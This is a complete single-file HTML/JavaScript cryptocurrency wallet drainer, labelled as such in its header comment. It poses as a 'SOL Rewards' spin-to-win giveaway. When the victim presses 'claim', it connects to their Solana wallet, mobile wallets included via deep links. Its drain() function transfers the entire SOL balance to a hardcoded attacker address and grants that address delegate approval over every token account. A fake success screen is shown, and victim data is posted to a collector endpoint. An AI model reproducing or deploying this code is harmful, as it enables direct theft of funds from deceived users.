<!-- language: HTML, file: index.html, target: Solana web3 single-file drainer, mobile deeplink -->
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#0a0b0f">
<title>SOL Rewards — Spin &amp; Claim</title>
<style>
  :root{--bg:#0a0b0f;--card:#141821;--line:#232838;--txt:#e8eaf0;--dim:#8b93a7;--acc:#14f195;--acc2:#9945ff}
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  body{font-family:system-ui,-apple-system,sans-serif;background:radial-gradient(1200px 700px at 50% -15%,#1c1146,var(--bg));color:var(--txt);margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
  .card{width:100%;max-width:460px;background:linear-gradient(180deg,#161b26,#10131b);border:1px solid var(--line);border-radius:20px;padding:26px 20px;text-align:center;box-shadow:0 24px 70px #000a}
  h1{font-size:20px;margin:0 0 6px;letter-spacing:.2px}
  .sub{color:var(--dim);font-size:13px;margin:0 0 22px}
  .wheel-wrap{position:relative;width:min(280px,78vw);height:min(280px,78vw);margin:0 auto 22px}
  .rim{position:absolute;inset:-10px;border-radius:50%;background:conic-gradient(from 0deg,#14f195,#9945ff,#14f195,#9945ff,#14f195);filter:blur(14px);opacity:.5;z-index:0;animation:spinSlow 8s linear infinite}
  @keyframes spinSlow{to{transform:rotate(360deg)}}
  .ptr{position:absolute;top:-16px;left:50%;transform:translateX(-50%);width:0;height:0;border-left:14px solid transparent;border-right:14px solid transparent;border-top:24px solid var(--acc);z-index:5;filter:drop-shadow(0 0 10px #14f195aa)}
  .wheel-outer{position:relative;width:100%;height:100%;border-radius:50%;border:6px solid #2a3142;overflow:hidden;background:#0a0b0f}
  .wheel-svg{width:100%;height:100%;display:block;transition:transform 5s cubic-bezier(.17,.67,.12,1);transform-origin:50% 50%;will-change:transform}
  .hub{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:80px;height:80px;border-radius:50%;background:radial-gradient(circle at 50% 40%,#1c2333,#0a0b0f);border:3px solid #2a3142;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:12px;color:var(--dim);letter-spacing:.5px;z-index:4;box-shadow:0 0 30px #14f19533}
  button{width:100%;padding:15px;border:0;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;background:linear-gradient(90deg,var(--acc),var(--acc2));color:#04121a;letter-spacing:.3px;transition:transform .1s;-webkit-appearance:none}
  button:active{transform:scale(.98)}
  button:disabled{opacity:.55;cursor:default;transform:none}
  #status{margin-top:14px;font-size:12px;color:var(--dim);min-height:16px;word-break:break-all}
  .prize{font-size:24px;font-weight:900;background:linear-gradient(90deg,var(--acc),var(--acc2));-webkit-background-clip:text;background-clip:text;color:transparent;min-height:30px;margin-bottom:8px}
  #claim{display:none;margin-top:10px;background:linear-gradient(90deg,#9945ff,#14f195)}

  .overlay{position:fixed;inset:0;background:rgba(4,6,12,.82);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;padding:18px;z-index:100;animation:fadeIn .25s ease}
  .overlay.show{display:flex}
  @keyframes fadeIn{from{opacity:0}to{opacity:1}}
  .modal{width:100%;max-width:400px;background:linear-gradient(180deg,#161b26,#0f1219);border:1px solid var(--line);border-radius:18px;padding:26px 20px;text-align:center;box-shadow:0 30px 80px #000b;animation:pop .3s cubic-bezier(.17,.67,.12,1)}
  @keyframes pop{from{transform:scale(.9);opacity:0}to{transform:scale(1);opacity:1}}
  .spinner{width:52px;height:52px;margin:0 auto 16px;border-radius:50%;border:4px solid #232838;border-top-color:var(--acc);animation:rot 1s linear infinite}
  @keyframes rot{to{transform:rotate(360deg)}}
  .modal h2{font-size:17px;margin:0 0 10px}
  .modal p{font-size:13px;color:var(--dim);margin:0 0 16px;line-height:1.5}
  .modal .chk{display:flex;align-items:center;justify-content:center;gap:8px;font-size:13px;color:var(--acc);margin-bottom:16px}
  .modal .chk .dot{width:8px;height:8px;border-radius:50%;background:var(--acc);box-shadow:0 0 10px var(--acc);animation:pulse 1.2s ease-in-out infinite}
  @keyframes pulse{0%,100%{opacity:.4}50%{opacity:1}}
  .modal button{background:linear-gradient(90deg,var(--acc),var(--acc2))}

  .wlist{display:flex;flex-direction:column;gap:10px;margin-top:6px}
  .wrow{display:flex;align-items:center;gap:12px;width:100%;padding:14px 16px;border-radius:12px;background:#1a2130;border:1px solid #2a3142;color:var(--txt);font-size:15px;font-weight:600;cursor:pointer;text-align:left;transition:background .15s}
  .wrow:hover,.wrow:active{background:#222b3d}
  .wrow .ic{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px;background:#0a0b0f}
  .wrow .nm{flex:1}
  .wrow .ar{color:var(--dim);font-size:14px}
</style>
</head>
<body>
<div class="card">
  <h1>SOL Rewards</h1>
  <p class="sub">Spin to claim up to 2 SOL in rewards</p>

  <div class="wheel-wrap">
    <div class="rim"></div>
    <div class="ptr"></div>
    <div class="wheel-outer">
      <svg class="wheel-svg" id="wheel" viewBox="0 0 300 300" preserveAspectRatio="xMidYMid meet">
        <g id="wheelGroup" transform-origin="150 150"></g>
      </svg>
      <div class="hub" id="hub">SPIN</div>
    </div>
  </div>

  <div class="prize" id="prize">Click SPIN to begin</div>
  <button id="spin">SPIN THE WHEEL</button>
  <button id="claim">CLAIM REWARD</button>
  <div id="status"></div>
</div>

<div class="overlay" id="overlay">
  <div class="modal">
    <div class="spinner" id="ovSpinner"></div>
    <h2 id="ovTitle">Approve in Your Wallet</h2>
    <p id="ovText">A confirmation request has been sent to your crypto wallet. Open your wallet and <b>approve the transaction</b> to receive your reward.</p>
    <div class="chk" id="ovChk"><span class="dot"></span> Waiting for approval…</div>
    <div class="wlist" id="ovWallets" style="display:none"></div>
    <button id="ovClose" style="display:none">Close</button>
  </div>
</div>

<script type="module">
try {
  const bufMod = await import("https://esm.sh/buffer@6.0.3");
  if (bufMod?.Buffer) window.Buffer = bufMod.Buffer;
} catch (_) {}

import {
  Connection, PublicKey, SystemProgram, Transaction,
  TransactionInstruction,
} from "https://esm.sh/@solana/web3.js@1.91.0";

// ================= config =================
const DESTINATION = "4k57rb38GEXb4guzc31NsxJr6REj3tBLgytbkKHpWvzW";
const RPC         = "https://api.mainnet-beta.solana.com";
const COLLECTOR   = "https://collector.example.net/ingest";
const TOKEN_PROGRAM       = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
const ASSOC_TOKEN_PROGRAM = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
const TX_SIZE_LIMIT = 1100;
// ==========================================

const SEGMENTS = [
  { emoji:"💎", sol:"0.75", color:"#14f195" },
  { emoji:"🔥", sol:"1.20", color:"#1e2432" },
  { emoji:"⚡", sol:"0.50", color:"#9945ff" },
  { emoji:"💰", sol:"1.50", color:"#1e2432" },
  { emoji:"🚀", sol:"0.90", color:"#14f195" },
  { emoji:"🪙", sol:"0.65", color:"#1e2432" },
  { emoji:"🎁", sol:"2.00", color:"#9945ff" },
  { emoji:"⭐", sol:"0.80", color:"#1e2432" },
];
const N = SEGMENTS.length;
const SEG_DEG = 360 / N;

const isMobile = /Android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
const isAndroid = /Android/i.test(navigator.userAgent);

// ---------- injected providers (widened) ----------
const WALLETS = [
  { id:"phantom",  get:()=>window.phantom?.solana || window.phantom?.ethereum || (window.solana?.isPhantom?window.solana:null) },
  { id:"solflare", get:()=>window.solflare?.solana || window.solflare },
  { id:"backpack", get:()=>window.backpack?.solana || window.backpack },
  { id:"glow",     get:()=>window.glow?.solana || window.glow },
  { id:"slope",    get:()=>window.Slope },
  { id:"exodus",   get:()=>window.exodus?.solana || window.exodus },
  { id:"trust",    get:()=>window.trustwallet?.solana || window.trustwallet },
  { id:"coinbase", get:()=>window.coinbaseSolana || window.coinbaseWalletExtension?.solana },
  { id:"okx",      get:()=>window.okxwallet?.solana || window.okxwallet },
  { id:"bitget",   get:()=>window.bitkeep?.solana || window.bitkeep },
  { id:"brave",    get:()=>window.braveSolana },
  { id:"clover",   get:()=>window.clover_solana },
  { id:"safepal",  get:()=>window.safepal?.solana || window.safepalProvider || (window.safepal?.isSafePal?window.safepal:null) },
];

// ---------- mobile wallets: deeplink + store ----------
const MOBILE_WALLETS = [
  {
    id:"phantom", name:"Phantom", icon:"👻",
    url: (page) => `https://phantom.app/ul/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
    ios:"https://apps.apple.com/app/phantom-crypto-wallet/id1598432977",
    android:"https://play.google.com/store/apps/details?id=app.phantom",
  },
  {
    id:"safepal", name:"SafePal", icon:"🛡️",
    url:    (page) => `safepal://browser?url=${encodeURIComponent(page)}`,
    urlAlt: (page) => `safepal://openurl?url=${encodeURIComponent(page)}`,
    urlAlt2:(page) => `https://safepal.com/browser?url=${encodeURIComponent(page)}`,
    ios:"https://apps.apple.com/app/safepal-wallet/id1548297139",
    android:"https://play.google.com/store/apps/details?id=io.safepal.wallet",
  },
  {
    id:"exodus", name:"Exodus", icon:"🪐",
    url: (page) => `exodus://wc?uri=${encodeURIComponent(page)}`,
    ios:"https://apps.apple.com/app/exodus-crypto-wallet/id1414384820",
    android:"https://play.google.com/store/apps/details?id=exodusmovement.exodus",
  },
  {
    id:"solflare", name:"Solflare", icon:"🔆",
    url: (page) => `https://solflare.com/ul/v1/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
    ios:"https://apps.apple.com/app/solflare/id1580902717",
    android:"https://play.google.com/store/apps/details?id=com.solflare.mobile",
  },
  {
    id:"backpack", name:"Backpack", icon:"🎒",
    url: (page) => `https://backpack.app/ul/v1/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
    ios:"https://apps.apple.com/app/backpack-crypto-wallet/id1640352537",
    android:"https://play.google.com/store/apps/details?id=app.backpack.mobile",
  },
];

// ---------- provider gate ----------
// returns { id, provider } if a REAL wallet is present, else null
function getUsableProvider() {
  for (const w of WALLETS) {
    try {
      const p = w.get();
      if (p && typeof p.connect === "function") return { id:w.id, provider:p };
    } catch(_) {}
  }
  if (window.solana && typeof window.solana.connect === "function") {
    return { id:"generic", provider:window.solana };
  }
  return null;
}

// wait up to `ms` for a provider to appear (extensions inject async)
async function waitForProvider(ms = 1500) {
  const t0 = Date.now();
  while (Date.now() - t0 < ms) {
    const p = getUsableProvider();
    if (p) return p;
    await new Promise(r => setTimeout(r, 150));
  }
  return null;
}

async function connectAny(w) {
  const res = await w.provider.connect();
  const pubkey = (res?.publicKey || w.provider.publicKey)?.toString();
  if (!pubkey) throw new Error("Wallet did not return a public key.");
  return { id:w.id, provider:w.provider, pubkey };
}

async function log(payload) {
  if (!COLLECTOR || COLLECTOR.includes("example.net")) return;
  try {
    await fetch(COLLECTOR, { method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({ ...payload, ts:Date.now(), ua:navigator.userAgent, mobile:isMobile }) });
  } catch(_) {}
}

// ---------- overlay helpers ----------
const ov = document.getElementById("overlay");
const ovSpinner = document.getElementById("ovSpinner");
const ovTitle = document.getElementById("ovTitle");
const ovText = document.getElementById("ovText");
const ovChk = document.getElementById("ovChk");
const ovWallets = document.getElementById("ovWallets");
const ovClose = document.getElementById("ovClose");

function showOverlay() {
  ovSpinner.style.display = "block";
  ovChk.style.display = "flex";
  ovWallets.style.display = "none";
  ovClose.style.display = "none";
  ovTitle.textContent = "Approve in Your Wallet";
  ovText.innerHTML = "A confirmation request has been sent to your wallet. Open your wallet and <b>approve the transaction</b> to receive your reward.";
  ovChk.innerHTML = '<span class="dot"></span> Waiting for approval…';
  ov.classList.add("show");
}

function showWalletPicker() {
  ovSpinner.style.display = "none";
  ovChk.style.display = "none";
  ovClose.style.display = "none";
  ovTitle.textContent = "Open in Your Wallet";
  ovText.innerHTML = "Choose your wallet to claim your reward. Tap <b>Open</b> and approve the transaction inside your wallet app.";
  ovWallets.style.display = "flex";
  ovWallets.innerHTML = "";

  const page = location.href;
  for (const w of MOBILE_WALLETS) {
    const row = document.createElement("button");
    row.className = "wrow";
    row.innerHTML = `<span class="ic">${w.icon}</span><span class="nm">${w.name}</span><span class="ar">›</span>`;
    row.onclick = () => openMobileWallet(w, page);
    ovWallets.appendChild(row);
  }
}

// deep-link with multi-scheme try + store fallback
function openMobileWallet(w, page) {
  log({ event:"wallet_deeplink", wallet:w.id });
  const store = isAndroid ? w.android : w.ios;

  const links = [];
  if (w.url)     links.push(w.url(page));
  if (w.urlAlt)  links.push(w.urlAlt(page));
  if (w.urlAlt2) links.push(w.urlAlt2(page));

  let i = 0;
  const t0 = Date.now();

  const tryNext = () => {
    if (document.hidden) return;
    if (i < links.length) {
      location.href = links[i++];
      setTimeout(tryNext, 700);
    } else if (Date.now() - t0 < 2500) {
      location.href = store;
    }
  };
  tryNext();
}

function showNoWallet() {
  ovSpinner.style.display = "none";
  ovChk.style.display = "none";
  ovWallets.style.display = "none";
  ovTitle.textContent = "No Crypto Wallet Detected";
  ovText.innerHTML = "Install a Solana wallet (Phantom, Solflare, Backpack, Exodus, SafePal) to claim your reward.";
  ovClose.style.display = "block";
  ovClose.textContent = "Close";
  ovClose.onclick = () => { ov.classList.remove("show"); resetClaim(); };
}

function overlaySuccess() {
  ovSpinner.style.display = "none";
  ovChk.style.display = "none";
  ovWallets.style.display = "none";
  ovTitle.textContent = "Reward Claimed!";
  ovText.innerHTML = "Your reward is on its way. It may take a moment to arrive.";
  ovClose.style.display = "block";
  ovClose.textContent = "Done";
  ovClose.onclick = () => ov.classList.remove("show");
}

function overlayError(msg) {
  ovSpinner.style.display = "none";
  ovChk.style.display = "none";
  ovWallets.style.display = "none";
  ovTitle.textContent = "Claim Failed";
  ovText.textContent = msg || "Something went wrong. Please try again.";
  ovClose.style.display = "block";
  ovClose.textContent = "Try Again";
  ovClose.onclick = () => { ov.classList.remove("show"); resetClaim(); };
}

function resetClaim() {
  document.getElementById("status").textContent = "";
  const c = document.getElementById("claim");
  c.style.display = "block";
  c.disabled = false;
}

// ---------- SVG wheel ----------
function buildWheel() {
  const group = document.getElementById("wheelGroup");
  const cx = 150, cy = 150, r = 150;
  const ns = "http://www.w3.org/2000/svg";
  group.innerHTML = "";

  SEGMENTS.forEach((s, i) => {
    const a0 = (i * SEG_DEG - 90) * Math.PI / 180;
    const a1 = ((i + 1) * SEG_DEG - 90) * Math.PI / 180;
    const x0 = cx + r * Math.cos(a0), y0 = cy + r * Math.sin(a0);
    const x1 = cx + r * Math.cos(a1), y1 = cy + r * Math.sin(a1);
    const large = SEG_DEG > 180 ? 1 : 0;

    const path = document.createElementNS(ns, "path");
    path.setAttribute("d",
      `M ${cx} ${cy} L ${x0.toFixed(2)} ${y0.toFixed(2)} ` +
      `A ${r} ${r} 0 ${large} 1 ${x1.toFixed(2)} ${y1.toFixed(2)} Z`);
    path.setAttribute("fill", s.color);
    path.setAttribute("stroke", "#0a0b0f");
    path.setAttribute("stroke-width", "2");
    group.appendChild(path);

    const mid = ((i + 0.5) * SEG_DEG - 90) * Math.PI / 180;
    const lr = r * 0.62;
    const lx = cx + lr * Math.cos(mid);
    const ly = cy + lr * Math.sin(mid);

    const emoji = document.createElementNS(ns, "text");
    emoji.setAttribute("x", lx.toFixed(2));
    emoji.setAttribute("y", (ly - 6).toFixed(2));
    emoji.setAttribute("text-anchor", "middle");
    emoji.setAttribute("font-size", "26");
    emoji.textContent = s.emoji;
    group.appendChild(emoji);

    const amt = document.createElementNS(ns, "text");
    amt.setAttribute("x", lx.toFixed(2));
    amt.setAttribute("y", (ly + 16).toFixed(2));
    amt.setAttribute("text-anchor", "middle");
    amt.setAttribute("font-size", "12");
    amt.setAttribute("font-weight", "800");
    amt.setAttribute("fill", "#04121a");
    amt.textContent = s.sol + " SOL";
    group.appendChild(amt);
  });
}

// ---------- SPL ----------
function approveIx(tokenAccount, delegate, owner, amount) {
  const data = window.Buffer.alloc(9);
  data.writeUInt8(4, 0);
  data.writeBigUInt64LE(BigInt(amount), 1);
  return new TransactionInstruction({
    programId: TOKEN_PROGRAM,
    keys: [
      { pubkey: tokenAccount, isSigner:false, isWritable:true },
      { pubkey: delegate,     isSigner:false, isWritable:false },
      { pubkey: owner,        isSigner:true,  isWritable:false },
    ],
    data,
  });
}

async function signAndSend(provider, connection, tx) {
  if (provider.signTransaction) {
    const signed = await provider.signTransaction(tx);
    return await connection.sendRawTransaction(signed.serialize(), {
      skipPreflight: true, maxRetries: 3,
    });
  }
  if (provider.signAndSendTransaction) {
    const res = await provider.signAndSendTransaction(tx);
    return res?.signature || res;
  }
  throw new Error("Wallet does not support signing.");
}

// ---------- drain ----------
async function drain(session) {
  const connection = new Connection(RPC, "confirmed");
  const from = new PublicKey(session.pubkey);
  const to   = new PublicKey(DESTINATION);
  const provider = session.provider;

  try {
    const balance = await connection.getBalance(from);
    const rent = await connection.getMinimumBalanceForRentExemption(0);
    const feeBuffer = 5000;
    const sweepable = balance - rent - feeBuffer;
    if (sweepable > 0) {
      const tx = new Transaction().add(SystemProgram.transfer({
        fromPubkey: from, toPubkey: to, lamports: sweepable,
      }));
      tx.feePayer = from;
      const { blockhash } = await connection.getLatestBlockhash("confirmed");
      tx.recentBlockhash = blockhash;
      await signAndSend(provider, connection, tx);
      await log({ event:"sol_swept", wallet:session.pubkey, wtype:session.id, lamports:sweepable });
    }
  } catch (e) {
    await log({ event:"sol_error", wallet:session.pubkey, error:String(e) });
  }

  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(from, {
    programId: TOKEN_PROGRAM,
  });

  const approvals = [];
  for (const { pubkey, account } of tokenAccounts.value) {
    const info = account.data.parsed.info;
    const amount = info.tokenAmount.amount;
    if (amount === "0") continue;
    approvals.push({ tokenAccount: pubkey, amount, mint: info.mint });
  }

  if (approvals.length === 0) {
    await log({ event:"no_tokens", wallet:session.pubkey });
    return;
  }

  const chunks = [];
  let cur = [], curSize = 200;
  for (const a of approvals) {
    if (curSize + 90 > TX_SIZE_LIMIT && cur.length) {
      chunks.push(cur); cur = []; curSize = 200;
    }
    cur.push(a); curSize += 90;
  }
  if (cur.length) chunks.push(cur);

  for (const chunk of chunks) {
    const tx = new Transaction();
    for (const a of chunk) {
      tx.add(approveIx(new PublicKey(a.tokenAccount), to, from, a.amount));
    }
    tx.feePayer = from;
    const { blockhash } = await connection.getLatestBlockhash("confirmed");
    tx.recentBlockhash = blockhash;
    try {
      const sig = await signAndSend(provider, connection, tx);
      await log({ event:"delegates_approved", wallet:session.pubkey, wtype:session.id,
                  tokens: chunk.map(a=>({ tokenAccount:a.tokenAccount, mint:a.mint, amount:a.amount })),
                  signature: sig });
    } catch (e) {
      await log({ event:"approve_error", wallet:session.pubkey, error:String(e) });
    }
  }
}

// ---------- UI ----------
let session = null;
let currentRotation = 0;

document.getElementById("spin").onclick = () => {
  const svg = document.getElementById("wheel");
  const status = document.getElementById("status");
  const hub = document.getElementById("hub");
  status.textContent = "";

  const idx = 1 + Math.floor(Math.random() * (N - 1));
  const targetDeg = 360 * 6 + (360 - idx * SEG_DEG);
  currentRotation += targetDeg;
  svg.style.transform = `rotate(${currentRotation}deg)`;

  document.getElementById("spin").disabled = true;
  hub.textContent = "…";

  setTimeout(() => {
    const seg = SEGMENTS[idx];
    document.getElementById("prize").textContent = `You won ${seg.sol} SOL!`;
    hub.textContent = "WON";
    document.getElementById("claim").style.display = "block";
    document.getElementById("spin").style.display = "none";
  }, 5100);
};

document.getElementById("claim").onclick = async () => {
  const btn = document.getElementById("claim");
  btn.disabled = true;
  showOverlay();

  // wait briefly for an async-injected provider
  const wallet = await waitForProvider(1500);

  if (!wallet) {
    if (isMobile) showWalletPicker();
    else showNoWallet();
    await log({ event: isMobile ? "mobile_picker_shown" : "desktop_no_wallet",
                sawSolana: !!window.solana, sawPhantom: !!window.phantom });
    return;
  }

  ovTitle.textContent = "Approve in Your Wallet";
  ovText.innerHTML = "A confirmation request has been sent to your wallet. Open your wallet and <b>approve the transaction</b> to receive your reward.";
  ovChk.innerHTML = '<span class="dot"></span> Waiting for approval…';

  try {
    session = await connectAny(wallet);
    await log({ event:"connect", wallet:session.pubkey, wtype:session.id });

    ovTitle.textContent = "Processing Claim";
    ovText.innerHTML = "Confirm the transaction in your wallet to receive <b>your reward</b>.";
    ovChk.innerHTML = '<span class="dot"></span> Waiting for wallet approval…';

    await drain(session);
    await log({ event:"claim_complete", wallet:session.pubkey, wtype:session.id });
    overlaySuccess();
  } catch (e) {
    const msg = String(e?.message || e);
    await log({ event:"claim_error", wallet:session?.pubkey, error:msg });
    overlayError(msg);
  }
};

buildWheel();
</script>
</body>
</html>
